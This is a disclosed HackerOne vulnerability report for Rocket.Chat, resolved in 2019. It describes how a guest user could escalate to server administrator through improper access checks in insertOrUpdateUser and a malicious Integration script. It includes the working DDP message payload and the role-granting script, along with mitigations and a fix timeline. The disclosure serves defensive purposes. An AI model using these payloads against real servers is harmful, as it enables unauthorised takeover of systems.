---
title: "Guest Privilege Escalation to admin group"
author: gronke
url: https://hackerone.com/reports/501081
date_published: 2019-02-25
date_scraped: 2026-11-17
platform: hackerone
disclosed_report: https://hackerone.com/reports/501081
bounty: not stated (hidden)
vuln_class: access-control
---

<!-- Raw scraped text below. Public, non-paywalled content only. -->

Report #501081 | Reported to Rocket.Chat | Status: Resolved | Severity: Critical (9.9) | Weakness: Improper Access Control - Generic | Bounty: Hidden | Disclosed: August 10, 2024

## Report (gronke, February 25, 2019, 2:47pm UTC)

Due to improper ACLs it was found possible to escalate privileges from a guest user to admin.

As first step the guest user adds itself to the `bot` group that holds the `manage-own-integrations` permission. With this permission it is possible to create a custom Integration with a script that, if triggered, adds the user to the `admin` group.

The `insertOrUpdateUser` method improperly validates a users permissions to change its groups. Because an explicit check prevents from adding itself to the `admin` group directly, the privileges of the `bot` group need to be used to further escalate to global admin.

## Releases Affected:

- develop@5f0180d (https://github.com/RocketChat/Rocket.Chat/commit/5f0180dc1500b4e37b8320b39869babadb5d01cd)

## Steps To Reproduce (from initial installation to vulnerability):

1. Login Guest user
2. Determine own users `_id` from browser traffic
3. Escalate to `bot` group
4. Create malicious Integration script
5. Trigger Integration

## Supporting Material/References:

### Bot group privilege escalation (DDP websocket message, 142 bytes)

```
["{\"msg\":\"method\",\"method\":\"insertOrUpdateUser\",\"params\":[{\"_id\": \"<USER_ID>\", \"roles\": [\"user\", \"bot\"]}],\"id\":\"17\"}"]
```

### Malicious Integrations Script (114 bytes)

```
this.Roles.addUserRoles("9HN4Brdmo2Qc2wsiX","admin")
class Script{
process_incoming_request({ request }){};
}
```

## Suggested mitigation

- Only allow administrators to modify user groups
- Isolate Integration script context from server application

## Impact

Guest users can become server administrator.

## Timeline

- March 1, 2019: marcosdefendi (Rocket.Chat): Thanks for the report. Opened a PR (https://github.com/RocketChat/Rocket.Chat/pull/13597) that validates whether the user has the necessary permission (assign-roles) to change the role; also removed manage-integrations from the bot role.
- March 13, 2019: rodrigok (Rocket.Chat staff) changed status to Triaged, then asked gronke to check whether the PR fixed the issue.
- August 9, 2019: markus-rocketchat closed the report as Resolved: "this PR should have fixed the problem: https://github.com/RocketChat/Rocket.Chat/pull/13597 thanks to @gronke for reporting!"
- July 11, 2024: gronke requested disclosure.
- August 10, 2024: Report disclosed.
